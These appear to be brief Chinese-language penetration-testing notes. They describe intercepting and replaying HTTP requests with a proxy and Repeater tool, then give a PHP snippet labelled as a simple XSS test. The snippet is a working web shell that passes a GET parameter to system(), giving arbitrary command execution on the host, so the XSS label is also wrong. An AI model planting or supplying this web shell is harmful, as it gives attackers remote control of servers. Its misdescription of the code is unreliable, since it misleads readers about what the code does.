
## 滲透

打開 Proxy 監聽
按下送出後 會卡住網頁取得該 Request
接著在檔案上右鍵選擇 Send to Repeater
在 Repeater 頁面可以修改 Request 並送出

* 簡單測試 XSS

<form method="GET" action="">
    <input type="text" name="cmd" autofocus>
    <input type="submit" value="Execute">
</form>
<pre>
    <?php
        $cmd = 'system';
        $param = 'cmd';
        if (isset($_GET[$param])) {
            $cmd($_GET[$param]);
        }
    ?>
</pre>